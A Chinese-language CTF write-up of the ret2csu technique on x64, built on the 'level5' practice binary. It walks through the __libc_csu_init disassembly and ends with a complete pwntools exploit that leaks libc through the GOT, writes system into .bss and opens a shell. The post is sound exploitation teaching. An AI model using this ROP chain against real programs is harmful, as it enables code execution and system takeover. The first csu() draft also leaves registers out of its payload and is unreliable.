---
layout: post
title: "libc-csu x64利用"
subtitle: "libc-csu x64利用"
author: "Novocaine#p1an0@qq.com"
header-img: "img/post-bg-dreamer.jpg"
header-mask: 0.4
tags:
  - PWN
  - 二进制安全
---


题目链接：
==
https://github.com/zhengmin1989/ROP_STEP_BY_STEP/raw/master/linux_x64/level5
前言
--

- ret2libc 无有效gadgets的利用方式
- 在使用libc的elf程序里，都会加载libc_csu_init，不同版本函数不同，本文用蒸米的《一步一步学ROP》的第五关来看看。
- 先来看看libc_csu_init是啥，直接IDA：
```
.text:00000000004005A0 ; void _libc_csu_init(void)
.text:00000000004005A0                 public __libc_csu_init
.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004005A0
.text:00000000004005A0 var_30          = qword ptr -30h
.text:00000000004005A0 var_28          = qword ptr -28h
.text:00000000004005A0 var_20          = qword ptr -20h
.text:00000000004005A0 var_18          = qword ptr -18h
.text:00000000004005A0 var_10          = qword ptr -10h
.text:00000000004005A0 var_8           = qword ptr -8
.text:00000000004005A0
.text:00000000004005A0 ; __unwind {
.text:00000000004005A0                 mov     [rsp+var_28], rbp
.text:00000000004005A5                 mov     [rsp+var_20], r12
.text:00000000004005AA                 lea     rbp, cs:600E24h
.text:00000000004005B1                 lea     r12, cs:600E24h
.text:00000000004005B8                 mov     [rsp+var_18], r13
.text:00000000004005BD                 mov     [rsp+var_10], r14
.text:00000000004005C2                 mov     [rsp+var_8], r15
.text:00000000004005C7                 mov     [rsp+var_30], rbx
.text:00000000004005CC                 sub     rsp, 38h
.text:00000000004005D0                 sub     rbp, r12
.text:00000000004005D3                 mov     r13d, edi
.text:00000000004005D6                 mov     r14, rsi
.text:00000000004005D9                 sar     rbp, 3
.text:00000000004005DD                 mov     r15, rdx
.text:00000000004005E0                 call    _init_proc
.text:00000000004005E5                 test    rbp, rbp
.text:00000000004005E8                 jz      short loc_400606
.text:00000000004005EA                 xor     ebx, ebx
.text:00000000004005EC                 nop     dword ptr [rax+00h]
.text:00000000004005F0
.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j
.text:00000000004005F0                 mov     rdx, r15
.text:00000000004005F3                 mov     rsi, r14
.text:00000000004005F6                 mov     edi, r13d
.text:00000000004005F9                 call    qword ptr [r12+rbx*8]
.text:00000000004005FD                 add     rbx, 1
.text:0000000000400601                 cmp     rbx, rbp
.text:0000000000400604                 jnz     short loc_4005F0
.text:0000000000400606
.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j
.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]
.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]
.text:0000000000400610                 mov     r12, [rsp+38h+var_20]
.text:0000000000400615                 mov     r13, [rsp+38h+var_18]
.text:000000000040061A                 mov     r14, [rsp+38h+var_10]
.text:000000000040061F                 mov     r15, [rsp+38h+var_8]
.text:0000000000400624                 add     rsp, 38h
.text:0000000000400628                 retn
.text:0000000000400628 ; } // starts at 4005A0
.text:0000000000400628 __libc_csu_init endp
```
- 可以看出来在最后一段是可以通过栈控制rbx,rbp,r12,r13,r14,r15
- 而linux下x64函数调用传参的顺序是rdi，rsi，rdx，rcx，r8，r9，后面都通过栈传递参数。
- 对比一下，好像并不能控制函数调用
但是4005F0处：
```
.text:00000000004005F0                 mov     rdx, r15
.text:00000000004005F3                 mov     rsi, r14
.text:00000000004005F6                 mov     edi, r13d
```
rdx = r15,rsi=r14,edi=r13d
rdi的低位=edi，所以同样能起到控制rdi的作用。
同时控制r12还能搞函数调用
```
.text:00000000004005FD                 add     rbx, 1
.text:0000000000400601                 cmp     rbx, rbp
.text:0000000000400604                 jnz     short loc_4005F0
```
只要控制rbx为0，rbp为1就行了
例题：
==
```C
ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]

  return read(0, &buf, 0x200uLL);
}
```

def csu
--
直接构造payload就行，这里方便理解把栈图画出来
```python
def csu(rbx,rbp,r12,r13,r14,r15):
    payload = padding + p64(csu_end)
    payload += p64(0)
    payload += p64(rbx)+p64(rbp)+p64(r13)+p64(r14)
    payload += p64(csu_start)
    payload += "a"*(6*8+8)
    payload += p64(main)
    s.sendline(payload)
```
在调用过libc_csu_init之后我们还需要把main函数覆盖到ret上，前面padding7*8个字节(6个寄存器+一个rbp)
所以得出：
	loc_400606 用来控制寄存器
	loc_4005F0 用来做函数调用
利用后的程序流程应该是：

vulnerable_function -> loc_400606 -> loc_4005F0 -> main -> vulnerable_function -> loc_400606 -> loc_4005F0 -> systemAddr

exploit
---
到这里就是基本操作了（看了别人的exp，比我写的好看多了QAQ
```python
from pwn import *

from LibcSearcher import LibcSearcher

import time

elf = ELF("level5")

proc = process("./level5")

write_got = elf.got["write"]

main = 0x0400564

padding = "a" * 0x88

csu_start = 0x4005F0

csu_end = 0x400606

def csu(rbx, rbp, r12, r13, r14, r15, ret):
	payload = ""
	payload += padding+p64(csu_end)
	payload += p64(0)
	payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
	payload += p64(csu_start)
	payload += "\x00" * (7*8)
	payload += p64(ret)
	proc.sendline(payload)

csu(0,1,write_got,1,write_got,8,main)

print proc.recvline()

write_addr = u64(proc.recvline()[0:8])

print hex(write_addr)

libc = LibcSearcher("write",write_addr)

libcbase = write_addr - libc.dump('write')

system = libcbase + libc.dump('system')

bin_sh = libcbase + libc.dump('str_bin_sh')

read_got = elf.got['read']

bss = 0x601028

csu(0,1,read_got,0,bss,16,main)

time.sleep(5)

proc.send(p64(system))

proc.send("/bin/sh"+"\x00")

csu(0,1,bss,bss+8,0,0,main)

proc.interactive()
```




```
